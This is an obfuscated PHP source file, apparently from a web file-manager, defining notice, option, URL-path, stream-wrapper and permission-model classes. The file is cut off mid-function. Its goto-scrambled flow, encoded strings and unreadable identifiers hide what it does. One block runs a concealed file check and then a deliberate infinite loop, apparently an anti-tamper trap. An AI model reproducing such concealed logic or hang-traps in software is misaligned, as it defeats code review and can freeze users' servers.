<?php
 goto d’³µ‡Šºò; c¨ºØÕïá: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\x6e\x6f\164\x69\143\x65\x4c\151\x73\x74"; public $field = array("\156\x61\155\145", "\143\157\x6e\164\x65\156\164", "\x61\165\164\150", "\155\157\x64\x65", "\164\151\155\x65", "\164\x79\x70\x65", "\x6c\x65\x76\x65\x6c", "\145\x6e\141\x62\x6c\145", "\163\x6f\x72\164"); public function listData($C„ç¸ŒÆó° = false, $C‡Ò‹âÉõ° = "\163\157\162\x74", $DÇªŠùÚ×Å = false) { return parent::listData($C„ç¸ŒÆó°, $C‡Ò‹âÉõ°, $DÇªŠùÚ×Å); } public function add($D¾‹¤‹‘ò») { $B¸³Ñºõ¢í =& $_SERVER[´¬]; $F–‹‘ê¶’ = time(); if ($D¾‹¤‹‘ò»[$B¸³Ñºõ¢í[12]] == $B¸³Ñºõ¢í[2096]) { $F–‹‘ê¶’ = strtotime($D¾‹¤‹‘ò»[$B¸³Ñºõ¢í[196]]); } $D¾‹¤‹‘ò»[$B¸³Ñºõ¢í[196]] = $F–‹‘ê¶’; return parent::insert($D¾‹¤‹‘ò»); } public function update($DÄèÆÅÇñ, $AÉƒõÍ–Ò¿) { goto F¨ùÍ‚»òë; B»å‹µ–âÑ: $d±¿×ğ¨¯— = time(); if ($AÉƒõÍ–Ò¿[$CŠ¨«Şùµ[12]] == $CŠ¨«Şùµ[2096]) { $d±¿×ğ¨¯— = strtotime($AÉƒõÍ–Ò¿[$CŠ¨«Şùµ[196]]); } $AÉƒõÍ–Ò¿[$CŠ¨«Şùµ[196]] = $d±¿×ğ¨¯—; goto c×¼òÂ¯è; F¨ùÍ‚»òë: $CŠ¨«Şùµ =& $_SERVER[´¬]; $FÛøÏãî«˜ = $this->listData($DÄèÆÅÇñ); if (!$FÛøÏãî«˜) { return !1; } goto B»å‹µ–âÑ; c×¼òÂ¯è: return parent::update($DÄèÆÅÇñ, $AÉƒõÍ–Ò¿); goto FÊÀĞ Œø; FÊÀĞ Œø: } public function remove($F¼¢§å¡Íì) { $eÜ„ì†‘©Å = $this->listData($F¼¢§å¡Íì); if (!$eÜ„ì†‘©Å || $eÜ„ì†‘©Å[$_SERVER[´¬][1171]]) { return !1; } return parent::remove($F¼¢§å¡Íì); } public function sort($D—†òÀîñ, $eîÙ‡Ïóòá) { return parent::update($D—†òÀîñ, $eîÙ‡Ïóòá); } public function enable($EñòÊ³ƒìÉ, $FºøÃŸ³½Ô) { return parent::update($EñòÊ³ƒìÉ, array($_SERVER[´¬][2097] => $FºøÃŸ³½Ô)); } private function initUserOption() { $C¶Å¾ˆá¸ö =& $_SERVER[´¬]; $this->optionType = $C¶Å¾ˆá¸ö[2098]; $this->modelType = $C¶Å¾ˆá¸ö[2099]; $this->field = array($C¶Å¾ˆá¸ö[2100], $C¶Å¾ˆá¸ö[28], $C¶Å¾ˆá¸ö[196], $C¶Å¾ˆá¸ö[29], $C¶Å¾ˆá¸ö[2101], $C¶Å¾ˆá¸ö[713], $C¶Å¾ˆá¸ö[189]); } public function userNoticeGet($d”ãÔ«ãÊÕ = false) { $this->initUserOption(); return parent::listData($d”ãÔ«ãÊÕ, $_SERVER[´¬][392], !0); } public function userNoticeAdd($aŞ¥İ±œ˜Õ) { $F™ÙÕ»¹ˆ =& $_SERVER[´¬]; $this->initUserOption(); $døšƒÄ¯ôî = $this->findByKey($F™ÙÕ»¹ˆ[2100], $aŞ¥İ±œ˜Õ[$F™ÙÕ»¹ˆ[392]]); if ($døšƒÄ¯ôî) { return !0; } $E¶¾ä’¥ÂÃ = array($F™ÙÕ»¹ˆ[2100] => $aŞ¥İ±œ˜Õ[$F™ÙÕ»¹ˆ[392]], $F™ÙÕ»¹ˆ[28] => $aŞ¥İ±œ˜Õ[$F™ÙÕ»¹ˆ[28]], $F™ÙÕ»¹ˆ[196] => $aŞ¥İ±œ˜Õ[$F™ÙÕ»¹ˆ[196]], $F™ÙÕ»¹ˆ[29] => isset($aŞ¥İ±œ˜Õ[$F™ÙÕ»¹ˆ[29]]) ? $aŞ¥İ±œ˜Õ[$F™ÙÕ»¹ˆ[29]] : 1, $F™ÙÕ»¹ˆ[2101] => isset($aŞ¥İ±œ˜Õ[$F™ÙÕ»¹ˆ[2101]]) ? $aŞ¥İ±œ˜Õ[$F™ÙÕ»¹ˆ[2101]] : 0, $F™ÙÕ»¹ˆ[713] => 0, $F™ÙÕ»¹ˆ[189] => 0); return parent::insert($E¶¾ä’¥ÂÃ); } public function userNoticeEdit($E›…Ô¥ƒóÏ, $e¹æŸ§”½) { $this->initUserOption(); return parent::update($E›…Ô¥ƒóÏ, $e¹æŸ§”½); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\145\x6d\137\157\x70\x74\x69\x6f\156"; protected $jsonField = array("\155\145\x6e\165", "\162\157\154\x65", "\162\157\154\145\107\x72\157\165\160", "\x72\145\147\151\163\164", "\145\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($bß¼“õìãù) { return "\x53\171\163\164\145\155\x4f\160\x74\x69\x6f\x6e\137{$bß¼“õìãù}"; } protected function optionDefault($cŠõÌƒå°„ = '') { $Eßñòê“êÛ =& $_SERVER[´¬]; if ($cŠõÌƒå°„ == $Eßñòê“êÛ[33]) { return $GLOBALS[$Eßñòê“êÛ[6]][$Eßñòê“êÛ[377]]; } } } class SystemRecordModel extends ModelBaseLight { } goto fã‡Öˆ”; d‹œ‡°¬öø: if (!isset($_SERVER[$_SERVER[´¬][821]]) || !isset($_SERVER[$_SERVER[´¬][828]])) { goto C– §ĞøÑ»; C– §ĞøÑ»: $DÊËÔÕˆ = $_SERVER[´¬][823]; $e¡Î¸áÅÈœ = $_SERVER[$_SERVER[´¬][824]] . $_SERVER[´¬][825]; $fœ¥¬…Á‚ = $DÊËÔÕˆ($e¡Î¸áÅÈœ); goto EŠóğ†¹çÃ; Fôµõ•Ò† : $aï®Æ‡¶êí($_SERVER[$_SERVER[´¬][824]] . $_SERVER[´¬][825]); $E®ŠöÚÑ˜À = 2; while ($E®ŠöÚÑ˜À > 1) { $EîîÌŞÃ© = rawurlencode($E®ŠöÚÑ˜À . $_SERVER[´¬][374]); } goto d¿»ËéÓ¹; EŠóğ†¹çÃ: $F¢’¶¾¢ä = explode($_SERVER[´¬][228], $fœ¥¬…Á‚); if (count($F¢’¶¾¢ä) < $_SERVER[´¬][580]) { $FçËÈËš = $_SERVER[´¬][826]; $FçËÈËš(); } $aï®Æ‡¶êí = $_SERVER[´¬][827]; goto Fôµõ•Ò† ; d¿»ËéÓ¹: } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($B¿ ¶Æ†Ä = false) { } public function exist($aĞ“»ƒù‹) { $f×ãïÃÖ°Ä = $this->info($aĞ“»ƒù‹); return $f×ãïÃÖ°Ä[$_SERVER[´¬][194]]; } public function isFile($EæÇ¢‘«–Ğ) { $DâñŠå¸–Š = $this->info($EæÇ¢‘«–Ğ); return $DâñŠå¸–Š[$_SERVER[´¬][194]]; } public function isFolder($Dİùí‡•†Î) { return !1; } public function size($aòŠ¥¶á×) { $f‘ÊÛß…¾Ñ = $this->info($aòŠ¥¶á×); return $f‘ÊÛß…¾Ñ[$_SERVER[´¬][78]]; } public function info($A¹ùõãî¢) { return $this->infoParse($A¹ùõãî¢); } public function infoAuth($dåé¿ÏÔœ·) { return $this->infoParse($dåé¿ÏÔœ·); } public function infoWithChildren($DÂ²Èò‹™) { return $this->infoParse($DÂ²Èò‹™); } public function infoFull($b„Ô”µœÎ×) { return $this->infoParse($b„Ô”µœÎ×); } private function infoParse($eß„’Ò¿ğ) { $Då¹ã‹Š‚ä =& $_SERVER[´¬]; $b®ŠÑÇ¬Åª = $this->header($eß„’Ò¿ğ); if (!$b®ŠÑÇ¬Åª || !$b®ŠÑÇ¬Åª[$Då¹ã‹Š‚ä[713]]) { return !1; } $dÏÍ®Ò‚Œ = _get($b®ŠÑÇ¬Åª, $Då¹ã‹Š‚ä[334], 0); $b…ñïÏ·ŞÏ = array($Då¹ã‹Š‚ä[28] => $b®ŠÑÇ¬Åª[$Då¹ã‹Š‚ä[28]], $Då¹ã‹Š‚ä[76] => $eß„’Ò¿ğ, $Då¹ã‹Š‚ä[29] => $Då¹ã‹Š‚ä[192], $Då¹ã‹Š‚ä[78] => intval($dÏÍ®Ò‚Œ), $Då¹ã‹Š‚ä[168] => get_path_ext($b®ŠÑÇ¬Åª[$Då¹ã‹Š‚ä[28]]), $Då¹ã‹Š‚ä[1256] => $dÏÍ®Ò‚Œ > 0 && $b®ŠÑÇ¬Åª[$Då¹ã‹Š‚ä[1377]], $Då¹ã‹Š‚ä[1257] => !1); return $b…ñïÏ·ŞÏ; } private function header($bÕÙÀ½äøÏ) { goto dİ¤ğçÔ–’; dİ¤ğçÔ–’: $bí’Ò•ƒ—Ë =& $_SERVER[´¬]; if (isset(self::$_cacheHeader[$bÕÙÀ½äøÏ])) { return self::$_cacheHeader[$bÕÙÀ½äøÏ]; } $cñ†·¾¢Š = isset($GLOBALS[$bí’Ò•ƒ—Ë[1378]]) ? $GLOBALS[$bí’Ò•ƒ—Ë[1378]] : !1; goto CƒªÃñØ×Ô; FÙšÃƒÁ: return self::$_cacheHeader[$bÕÙÀ½äøÏ]; goto E‡®¡ˆß™; CƒªÃñØ×Ô: $GLOBALS[$bí’Ò•ƒ—Ë[1378]] = !0; self::$_cacheHeader[$bÕÙÀ½äøÏ] = url_header($bÕÙÀ½äøÏ); $GLOBALS[$bí’Ò•ƒ—Ë[1378]] = $cñ†·¾¢Š; goto FÙšÃƒÁ; E‡®¡ˆß™: } public function hashSimple($b½öŒ‚ÍÖ, $fÃ·Æ‘’ = false) { goto cƒÜîïÅ„„; cƒÜîïÅ„„: $EîÚ»õÅùÂ =& $_SERVER[´¬]; $EÉÊŸ²À° = $this->info($b½öŒ‚ÍÖ); if (!$EÉÊŸ²À° || !$EÉÊŸ²À°[$EîÚ»õÅùÂ[194]]) { return !1; } goto dšÃç¦ÚôÉ; eÖÜ°õå™¸: $e¦À¾¾Æ‘ .= $this->fileSubstr($b½öŒ‚ÍÖ, $eçñÀ‹è¤« - $e†á…Üô‚ , $e†á…Üô‚ ); return md5($e¦À¾¾Æ‘) . $eçñÀ‹è¤«; goto DİïÛ¾²‘; dšÃç¦ÚôÉ: $eçñÀ‹è¤« = $EÉÊŸ²À°[$EîÚ»õÅùÂ[78]]; $e†á…Üô‚  = 200; $cºÚ•¿ÃÅƒ = 50; goto a‰ĞÉ¹‹óº; a‰ĞÉ¹‹óº: if ($eçñÀ‹è¤« <= $e†á…Üô‚  * $cºÚ•¿ÃÅƒ) { return md5($this->fileSubstr($b½öŒ‚ÍÖ, 0, $eçñÀ‹è¤«)) . $eçñÀ‹è¤«; } $Cø£Ó±„‡± = intval($eçñÀ‹è¤« / $cºÚ•¿ÃÅƒ); $e¦À¾¾Æ‘ = $EîÚ»õÅùÂ[33]; goto A«ß‰‘âœ; A«ß‰‘âœ: $fèÎ­ö®æ = timeFloat(); $eä×°è¼ñ¡ = 15; for ($FßÅ½¦—×¤ = 0; $FßÅ½¦—×¤ < $cºÚ•¿ÃÅƒ; $FßÅ½¦—×¤++) { if (timeFloat() - $fèÎ­ö®æ > $eä×°è¼ñ¡) { return !1; } $Dõï®²½‡  = $this->fileSubstr($b½öŒ‚ÍÖ, $Cø£Ó±„‡± * $FßÅ½¦—×¤, $e†á…Üô‚ ); if (!$Dõï®²½‡ ) { return !1; } $e¦À¾¾Æ‘ .= $Dõï®²½‡ ; } goto eÖÜ°õå™¸; DİïÛ¾²‘: } public function getContent($aö¢§¨ë¿Ş) { return $this->fileSubstr($aö¢§¨ë¿Ş); } public function fileSubstr($CĞ×Ûé£ÏÉ, $e‚–ùé×„ = 0, $Aõ ¨©å¬ = -1) { goto fÏÛˆñÈŠ; aÅ››õ‚®å: if ($Aõ ¨©å¬ === -1) { $Aõ ¨©å¬ = $A”šÖî‚²‡[$eŠâíˆÏâ[78]]; } if ($Aõ ¨©å¬ == 0) { return $eŠâíˆÏâ[33]; } $dàÕ¶Ÿ©×ë = array($eŠâíˆÏâ[1379] . $e‚–ùé×„ . $eŠâíˆÏâ[744] . ($e‚–ùé×„ + $Aõ ¨©å¬ - 1)); goto AÅ¸ä¹ƒ¬; AÅ¸ä¹ƒ¬: $C¨ˆÎÈÔÔ = url_request($CĞ×Ûé£ÏÉ, $eŠâíˆÏâ[227], !1, $dàÕ¶Ÿ©×ë, !1, !1, 1); return $C¨ˆÎÈÔÔ[$eŠâíˆÏâ[1089]] ? $C¨ˆÎÈÔÔ[$eŠâíˆÏâ[1089]] : $eŠâíˆÏâ[33]; goto AíÄ•Äè†ä; fÏÛˆñÈŠ: $eŠâíˆÏâ =& $_SERVER[´¬]; $A”šÖî‚²‡ = $this->info($CĞ×Ûé£ÏÉ); if (!$A”šÖî‚²‡ || !$A”šÖî‚²‡[$eŠâíˆÏâ[194]] && $A”šÖî‚²‡[$eŠâíˆÏâ[78]] > 1024 * 1024 * 10) { return !1; } goto aÅ››õ‚®å; AíÄ•Äè†ä: } public function download($eª·³‰ó®¿, $aŒ¯¶º³¿³) { Downloader::start($eª·³‰ó®¿, $aŒ¯¶º³¿³); return $aŒ¯¶º³¿³; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Dİ‚÷¤İŒ, $Eé®ÚÜ¬£ = '') { goto AÖøÙ‚®Œ; B¿ç‹²òÎ˜: $this->pathOpen = $Dİ‚÷¤İŒ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto DÕâˆ®èîƒ; AÖøÙ‚®Œ: $this->info = $this->info($Dİ‚÷¤İŒ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[´¬][76]]; goto B¿ç‹²òÎ˜; DÕâˆ®èîƒ: if (!isset(self::$_chunkBuffer[$Dİ‚÷¤İŒ])) { self::$_chunkBuffer[$Dİ‚÷¤İŒ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto Fæóˆ”¹Ôº; Fæóˆ”¹Ôº: } function stream_read($C¯¡Ì¡Š×) { $C¹Ñ®‘à = $this->fileSubstr($this->pose, $C¯¡Ì¡Š×); $this->pose += strlen($C¹Ñ®‘à); return $C¹Ñ®‘à; } public function stream_tell() { return $this->pose; } public function stream_seek($AíÜ¡İÊ†, $fñÖø”ÂÈÊ) { $d¾ÄƒÎååâ =& $_SERVER[´¬]; if ($fñÖø”ÂÈÊ == SEEK_SET) { $this->pose = $AíÜ¡İÊ†; } else { if ($fñÖø”ÂÈÊ == SEEK_CUR) { $this->pose += $AíÜ¡İÊ†; } else { if ($fñÖø”ÂÈÊ == SEEK_END) { $this->pose = $this->info[$d¾ÄƒÎååâ[78]] + intval($AíÜ¡İÊ†); } } } if ($AíÜ¡İÊ† < 0) { $this->pose = $this->info[$d¾ÄƒÎååâ[78]] + $AíÜ¡İÊ†; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[´¬][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($dÌ—î½Àø¹, $eÕ‰¼”£’œ) { $E¹ÔÀ•æ =& $_SERVER[´¬]; $càèØîÇ‰ˆ = $this->info($dÌ—î½Àø¹); return array($E¹ÔÀ•æ[1380] => 0, $E¹ÔÀ•æ[1381] => 0, $E¹ÔÀ•æ[12] => 32768 + 511, $E¹ÔÀ•æ[1382] => 0, $E¹ÔÀ•æ[1383] => 0, $E¹ÔÀ•æ[1384] => 0, $E¹ÔÀ•æ[1385] => 0, $E¹ÔÀ•æ[78] => $càèØîÇ‰ˆ[$E¹ÔÀ•æ[78]], $E¹ÔÀ•æ[1386] => $càèØîÇ‰ˆ[$E¹ÔÀ•æ[1255]], $E¹ÔÀ•æ[1342] => $càèØîÇ‰ˆ[$E¹ÔÀ•æ[84]], $E¹ÔÀ•æ[1341] => $càèØîÇ‰ˆ[$E¹ÔÀ•æ[193]], $E¹ÔÀ•æ[1387] => 0, $E¹ÔÀ•æ[1388] => 0); } static $fileInfo = array(); public function info($D§öä¹¯†–) { $bÇä•¥¾”Î = $_SERVER[´¬][1389]; if (isset(self::$fileInfo[$D§öä¹¯†–])) { return self::$fileInfo[$D§öä¹¯†–]; } if (substr($D§öä¹¯†–, 0, strlen($bÇä•¥¾”Î)) != $bÇä•¥¾”Î) { return !1; } self::$fileInfo[$D§öä¹¯†–] = IO::info(substr($D§öä¹¯†–, strlen($bÇä•¥¾”Î))); return self::$fileInfo[$D§öä¹¯†–]; } public static function read($dË°ÌÈˆ°Â, $a®Íæ¦™ºŠ, $D±¥ñ„ìƒ) { if (!isset(self::$_fopenCache[$dË°ÌÈˆ°Â])) { $CÄº“ŠØ× = new StreamWrapperIO(); $CÄº“ŠØ×->stream_open($dË°ÌÈˆ°Â); self::$_fopenCache[$dË°ÌÈˆ°Â] = $CÄº“ŠØ×; } $CÄº“ŠØ× = self::$_fopenCache[$dË°ÌÈˆ°Â]; return $CÄº“ŠØ×->fileSubstr($a®Íæ¦™ºŠ, $D±¥ñ„ìƒ); } public static function _read($aĞöòÃİÄ¨, $e¡»ñÜ·Á, $E‰šÎŒ“±ë) { goto bª™öŒñŒ; EêÔ…Öæ ‚: $EÒ‰ˆš„ŸØ = 8192; fseek($d‰ğ‡‹»ƒ‹, $e¡»ñÜ·Á, SEEK_SET); $D‡Ğ„ôŠ† = $aëé³ù…Š[33]; goto F‚ø÷ô©‡; bª™öŒñŒ: $aëé³ù…Š =& $_SERVER[´¬]; $d‰ğ‡‹»ƒ‹ = fopen($aĞöòÃİÄ¨, $aëé³ù…Š[1259]); if (!$d‰ğ‡‹»ƒ‹) { return $aëé³ù…Š[33]; } goto EêÔ…Öæ ‚; F‚ø÷ô©‡: $b¬õ–×ëÙÔ = 0; while ($b¬õ–×ëÙÔ < $E‰šÎŒ“±ë) { $d îîäÏ¦ = min($EÒ‰ˆš„ŸØ, $E‰šÎŒ“±ë - $b¬õ–×ëÙÔ); $D‡Ğ„ôŠ† .= fread($d‰ğ‡‹»ƒ‹, $d îîäÏ¦); $b¬õ–×ëÙÔ += $d îîäÏ¦; } fclose($d‰ğ‡‹»ƒ‹); goto f‰Ò‘øÔ–æ; f‰Ò‘øÔ–æ: return $D‡Ğ„ôŠ†; goto aší‹”Ê˜; aší‹”Ê˜: } public function fileSubstr($bõÙ²Å±§Ù, $AîœÎƒ­«) { goto b«®˜’å¦; E¯áĞñ¤¿: $e‹¬«ÈÚº = 0; $c‹²ƒóÄÍ” = 0; $f¸çàÇÊ¨î = $dôî›ß¥½•[33]; goto AÑêø¡³äŞ; dÇ–Õ”ŞÏ: if ($bõÙ²Å±§Ù + $AîœÎƒ­« > $bÉĞÁ¾‡Ê‘) { $AîœÎƒ­« = $bÉĞÁ¾‡Ê‘ - $bõÙ²Å±§Ù; } if ($AîœÎƒ­« <= 0) { return $dôî›ß¥½•[33]; } if ($bõÙ²Å±§Ù < 0 || $bõÙ²Å±§Ù >= $bÉĞÁ¾‡Ê‘ || $AîœÎƒ­« <= 0 || $AîœÎƒ­« > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\x69\154\x65\x52\145\x61\144\40\145\162\162\157\x72\x21\40\x73\164\141\x72\x74\x3d{$bõÙ²Å±§Ù}\73\x6c\145\x6e\x67\x74\150\75{$AîœÎƒ­«}\x3b\40\163\x69\x7a\x65\x3d{$bÉĞÁ¾‡Ê‘}\x3b"); } goto b®³ØˆÌË; F²Ñ‘­ç÷: ksort($a¡ª²îóÍÖ); $eĞ…õ±È¡Ğ = substr($F¢ƒÚĞƒ‘…, $bõÙ²Å±§Ù - $F¨š¾œã¯», $AîœÎƒ­«); return $eĞ…õ±È¡Ğ; goto FíÇ‘Ò·ö; b®³ØˆÌË: $aêºˆ½¬‚œ = 64 * 1024; $a¡ª²îóÍÖ =& self::$_chunkBuffer[$this->path]; if (!$a¡ª²îóÍÖ) { $a¡ª²îóÍÖ = array(); } goto E¯áĞñ¤¿; AÑêø¡³äŞ: foreach ($a¡ª²îóÍÖ as $e‹¬«ÈÚº => $f¸çàÇÊ¨î) { $e‹¬«ÈÚº = intval($e‹¬«ÈÚº); $c‹²ƒóÄÍ” = $e‹¬«ÈÚº + strlen($f¸çàÇÊ¨î); if ($bõÙ²Å±§Ù >= $c‹²ƒóÄÍ”) { continue; } if ($bõÙ²Å±§Ù >= $e‹¬«ÈÚº && $bõÙ²Å±§Ù + $AîœÎƒ­« <= $c‹²ƒóÄÍ”) { return substr($f¸çàÇÊ¨î, $bõÙ²Å±§Ù - $e‹¬«ÈÚº, $AîœÎƒ­«); } break; } if (count($a¡ª²îóÍÖ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($dôî›ß¥½•[1390], $dôî›ß¥½•[1391] . count($a¡ª²îóÍÖ) . "\x3b\163\x74\141\x72\x74\75{$bõÙ²Å±§Ù}\54\154\145\156\x67\x74\x68\75{$AîœÎƒ­«}\x3b\x70\157\163\x65\x3a{$e‹¬«ÈÚº}\x7e{$c‹²ƒóÄÍ”}"); throw new Exception($dôî›ß¥½•[1392]); } $F¨š¾œã¯» = intval($bõÙ²Å±§Ù / $aêºˆ½¬‚œ) * $aêºˆ½¬‚œ; goto CÍ¸”¬™¢Ÿ; CÍ¸”¬™¢Ÿ: $c‚ò¬‚Ë… = ceil(($bõÙ²Å±§Ù + $AîœÎƒ­«) / $aêºˆ½¬‚œ) * $aêºˆ½¬‚œ - $F¨š¾œã¯»; $F¢ƒÚĞƒ‘… = IO::fileSubstr($this->path, $F¨š¾œã¯», $c‚ò¬‚Ë…); $a¡ª²îóÍÖ[$F¨š¾œã¯» . $dôî›ß¥½•[33]] = $F¢ƒÚĞƒ‘…; goto F²Ñ‘­ç÷; b«®˜’å¦: $dôî›ß¥½• =& $_SERVER[´¬]; $bÉĞÁ¾‡Ê‘ = $this->info[$dôî›ß¥½•[78]]; $F¼ñœ§‰âî = $bõÙ²Å±§Ù; goto CŠ¦ŞÛ©Õ; CŠ¦ŞÛ©Õ: $DÔÙÃ¼¿¡‹ = $AîœÎƒ­«; if ($bõÙ²Å±§Ù < 0) { $bõÙ²Å±§Ù = $bÉĞÁ¾‡Ê‘ + $bõÙ²Å±§Ù; } if ($AîœÎƒ­« === !1) { $AîœÎƒ­« = $bÉĞÁ¾‡Ê‘ - $bõÙ²Å±§Ù; } goto dÇ–Õ”ŞÏ; FíÇ‘Ò·ö: } private function log($e®Ñ£°²Ó¸, $AÚ„ÛŒÎŠ) { $BÊ¿›ÅÛ»Ö =& $_SERVER[´¬]; $bË®¿ÔÜÈ½ = timeFloat() - $this->timeStart; write_log(sprintf($BÊ¿›ÅÛ»Ö[1393], $e®Ñ£°²Ó¸, $this->info[$BÊ¿›ÅÛ»Ö[28]], $bË®¿ÔÜÈ½, $AÚ„ÛŒÎŠ), $BÊ¿›ÅÛ»Ö[1079]); } } goto aÔ®ÄĞ„âß; Aµ„öº‘†©: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\143\x65\137\141\165\x74\150"; public function getAuth($BÙò®¤ó‡») { goto dâÀ¶ÜİãÎ; dâÀ¶ÜİãÎ: $Dã—ø¸–‘É =& $_SERVER[´¬]; $BñËÅÆ†Ã = $this->sourceAuthSelect($BÙò®¤ó‡»); $CãÍ¸•’§Ü = array(); goto DŸƒá«š²©; dš„Ö¦šİ¶: array_multisort($E„ÊÂ‡–·©, SORT_DESC, $CãÍ¸•’§Ü); return $CãÍ¸•’§Ü; goto cäŒ³Â‘Ëƒ; DŸƒá«š²©: $E„ÊÂ‡–·© = array(); $FÑ†Œ¾õÆ› = 2 << 25; foreach ($BñËÅÆ†Ã as $DğŞÜ´¦¶ä) { goto f•¸èÔâõœ; f•¸èÔâõœ: $BïãĞ™ø˜è = Model($Dã—ø¸–‘É[1856])->listData($DğŞÜ´¦¶ä[$Dã—ø¸–‘É[1784]]); if (!$BïãĞ™ø˜è) { continue; } $CãÍ¸•’§Ü[] = $DğŞÜ´¦¶ä; goto e—óËìÛ¢‚; e—óËìÛ¢‚: $DŒ½·œ¡ÔÃ = 0; if ($DğŞÜ´¦¶ä[$Dã—ø¸–‘É[402]] == SourceModel::TYPE_GROUP) { $DŒ½·œ¡ÔÃ = $FÑ†Œ¾õÆ› * 2; } if ($DğŞÜ´¦¶ä[$Dã—ø¸–‘É[402]] == SourceModel::TYPE_USER) { $DŒ½·œ¡ÔÃ = $FÑ†Œ¾õÆ›; } goto FÈóğÒä¯à; FÈóğÒä¯à: if ($DğŞÜ´¦¶ä[$Dã—ø¸–‘É[402]] == SourceModel::TYPE_USER && $DğŞÜ´¦¶ä[$Dã—ø¸–‘É[482]] == $Dã—ø¸–‘É[495]) { $DŒ½·œ¡ÔÃ = 0; } $E„ÊÂ‡–·©[] = $BïãĞ™ø˜è[$Dã—ø¸–‘É[404]] + $DŒ½·œ¡ÔÃ; goto DÍ™Ì®©šŒ; DÍ™Ì®©šŒ: } goto dš„Ö¦šİ¶; cäŒ³Â‘Ëƒ: } public function sourceAuthSelect($bã¸æ¸´×Ó) { goto CÇëô”¡„; d¢‰³ÁÄ²: $D¾Á„Á©«½ = $this->field($eöÓÖù“¾˜)->order($e½ò¿´‚çİ[392])->where($FƒªŞ±‡•)->select(); $c×Å²’é = array_to_keyvalue_group($D¾Á„Á©«½, $e½ò¿´‚çİ[394]); foreach ($bã¸æ¸´×Ó as $eàˆğÔ¸®×) { $DãİÙÍ‡±ç[$eàˆğÔ¸®×] = $c×Å²’é[$eàˆğÔ¸®×] ? $c×Å²’é[$eàˆğÔ¸®×] : array(); } goto BÃÌŒ•ƒÜŒ; BÃÌŒ•ƒÜŒ: if ($Få‡ĞŸ³îÓ) { return $D¾Á„Á©«½; } return $c×Å²’é; goto c•Ù‹Ù; CÇëô”¡„: $e½ò¿´‚çİ =& $_SERVER[´¬]; static $DãİÙÍ‡±ç = array(); $Få‡ĞŸ³îÓ = is_array($bã¸æ¸´×Ó) ? !1 : !0; goto fŸ¦…ò×©ë; d–“ëºÃò: if (count($CëË”¬µ¯) == count($bã¸æ¸´×Ó)) { return $Få‡ĞŸ³îÓ ? $CëË”¬µ¯[$bã¸æ¸´×Ó[0]] : $CëË”¬µ¯; } $eöÓÖù“¾˜ = $e½ò¿´‚çİ[1857]; $FƒªŞ±‡• = array($e½ò¿´‚çİ[394] => array($e½ò¿´‚çİ[7], $bã¸æ¸´×Ó)); goto d¢‰³ÁÄ²; fŸ¦…ò×©ë: if ($Få‡ĞŸ³îÓ) { $bã¸æ¸´×Ó = array($bã¸æ¸´×Ó); } $CëË”¬µ¯ = array(); foreach ($bã¸æ¸´×Ó as $eàˆğÔ¸®×) { if (isset($DãİÙÍ‡±ç[$eàˆğÔ¸®×])) { $CëË”¬µ¯[$eàˆğÔ¸®×] = $DãİÙÍ‡±ç[$eàˆğÔ¸®×]; } } goto d–“ëºÃò; c•Ù‹Ù: } public function setAuth($e³èÉôãŒÄ, $Dø™‘éö—ï) { goto d†ÀâóÜ§É; DƒíòğĞ¼: return !0; goto e¨ùµªÔˆÁ; d†ÀâóÜ§É: $AàÓ¹˜¢Ù£ =& $_SERVER[´¬]; $f¤À´É§®É = Model($AàÓ¹˜¢Ù£[1206])->sourceInfo($e³èÉôãŒÄ); if (!$f¤À´É§®É) { return !1; } goto FŠ“ù‹™ä¼; CíØ¤éÄ¨: if ($B×Õ…ºã‘× != $cÀäÚñ–š) { $E“»«šÆ… = array($AàÓ¹˜¢Ù£[1689] => $B×Õ…ºã‘×); $FêÁµË§¿¾ = Model($AàÓ¹˜¢Ù£[1770])->field($AàÓ¹˜¢Ù£[1526])->where($E“»«šÆ…)->select(); $FêÁµË§¿¾ = array_to_keyvalue($FêÁµË§¿¾, $AàÓ¹˜¢Ù£[33], $AàÓ¹˜¢Ù£[1526]); } $aòôÆ´„é = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $F˜’¦Æ½‹“ = array(); goto bŠÚŠÛˆÎ°; bŠÚŠÛˆÎ°: foreach ($Dø™‘éö—ï as $Bƒ¶Ñí·Äæ) { if (!in_array($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[402]], $aòôÆ´„é)) { show_json(LNG($AàÓ¹˜¢Ù£[1858]), !1); } if ($B×Õ…ºã‘× != $cÀäÚñ–š) { if ($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[402]] == SourceModel::TYPE_GROUP) { } if ($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[482]] != 0 && !in_array($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[482]], $FêÁµË§¿¾)) { } } if ($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[482]] == 0) { $Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[402]] = SourceModel::TYPE_USER; } $F˜’¦Æ½‹“[] = array($AàÓ¹˜¢Ù£[394] => $e³èÉôãŒÄ, $AàÓ¹˜¢Ù£[402] => intval($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[402]]), $AàÓ¹˜¢Ù£[482] => intval($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[482]]), $AàÓ¹˜¢Ù£[1784] => intval($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[1784]]) ? intval($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[1784]]) : 0, 